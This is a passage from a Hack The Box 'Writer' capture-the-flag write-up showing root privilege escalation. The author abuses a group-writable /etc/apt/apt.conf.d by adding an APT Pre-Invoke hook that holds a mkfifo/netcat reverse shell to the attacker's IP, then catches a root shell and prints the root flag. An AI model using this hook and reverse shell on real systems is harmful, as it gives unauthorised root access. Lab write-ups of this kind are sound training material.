# # `Enumeration` -

```bash 
root@napster:~/Documents/HTB/Writer# ssh -i id_rsa john@10.10.11.101
<snip>
john@writer:~$ ls -la
total 28
drwxr-xr-x 4 john john 4096 Aug  5 09:56 .
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 May 14  2021 .bash_logout
-rw-r--r-- 1 john john 3771 May 14  2021 .bashrc
drwx------ 2 john john 4096 Jul 28 09:19 .cache
-rw-r--r-- 1 john john  807 May 14  2021 .profile
drwx------ 2 john john 4096 Jul  9 12:29 .ssh
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

He is in `management` group lets check it out -

```bash
john@writer:~$ find / -group management -ls 2>/dev/null
    17525      4 drwxrwxr-x   2 root     management     4096 Jul 28 09:24 /etc/apt/apt.conf.d
john@writer:~$ cd /etc/apt/apt.conf.d/
john@writer:/etc/apt/apt.conf.d$ ls -la
total 48
drwxrwxr-x 2 root management 4096 Jul 28 09:24 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
```

Googling around i found a very helpful post -

[Apt_Priv_Esc](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)

Looking through the article there should be something running ‘sudo apt-get update’ command so let’s see if there is anything running that command using `pspy64`.

Lets get the tool on the remote machine -

![[Pasted image 20220101114409.png]]

```bash
john@writer:~$ ls -la                                                                                                                   
total 1160                                                                                                                              
drwxr-xr-x 4 john john    4096 Jan  1 16:43 .                                                                                           
drwxr-xr-x 4 root root    4096 Jul  9 10:59 ..                                                                                          
lrwxrwxrwx 1 root root       9 May 19  2021 .bash_history -> /dev/null                                                                  
-rw-r--r-- 1 john john     220 May 14  2021 .bash_logout                                                                                
-rw-r--r-- 1 john john    3771 May 14  2021 .bashrc                                                                                     
drwx------ 2 john john    4096 Jul 28 09:19 .cache                                                                                      
-rw-r--r-- 1 john john     807 May 14  2021 .profile                                                                                    
-rw-rw-r-- 1 john john 1156536 Jan  1 16:40 pspy64s                                                                                     
drwx------ 2 john john    4096 Jul  9 12:29 .ssh                                                                                        
john@writer:~$ chmod +x pspy64s                                                                                                        
john@writer:~$ ./pspy64s -pf -i 1000
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                           


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░      
                               ░ ░      

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify eve
nts ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
<snip>
2022/01/01 16:46:01 CMD: UID=0    PID=86206  | /usr/bin/apt-get update 
<snip>
```

To get a shell -

Start your listener and execute -

```bash
john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 9001 >/tmp/f"};' > /etc/apt/apt.conf.d/napster
```

```bash
root@napster:~/Documents/HTB/Writer# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.101] 35750
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -la
total 44
drwx------  7 root root 4096 Jul  9 10:59 .
drwxr-xr-x 20 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx  1 root root    9 May 18  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jun 22  2021 .cache
drwxr-xr-x  3 root root 4096 Jul  9 10:59 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-r--------  1 root root   33 Dec 31 06:18 root.txt
drwxr-xr-x  3 root root 4096 Jul  9 10:59 .scripts
drwxr-xr-x  3 root root 4096 May 13  2021 snap
drwx------  2 root root 4096 May 17  2021 .ssh
-rw-rw-rw-  1 root root  881 Jul  8 21:15 .viminfo
# cat root.txt
0b86aeef15c7f72572438bad8e7aec2a
```